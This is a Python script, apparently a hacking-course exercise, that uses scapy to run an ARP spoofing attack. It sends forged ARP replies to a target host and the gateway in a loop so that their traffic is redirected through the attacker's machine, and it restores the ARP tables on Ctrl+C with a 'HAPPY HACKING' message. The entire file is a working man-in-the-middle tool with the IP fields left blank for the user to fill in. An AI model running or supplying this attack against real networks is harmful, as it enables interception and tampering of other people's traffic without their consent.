#!/usr/bin/env python3

import scapy.all as scapy
import time


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc


def restore_table(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

# Add the IPs here
target_ip = ""
gateway_ip = ""

# Add a function to take target and getway ip from the terminal as arguments

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


send_packets_count = 0
try:
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        send_packets_count = send_packets_count + 2
        print("\r[+] Packets send: " + str(send_packets_count), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("[-] Detecting CTRL + C ...... Resetting ARP tables .... HAPPY HACKING")
    restore_table(target_ip, gateway_ip)
    restore_table(gateway_ip, target_ip)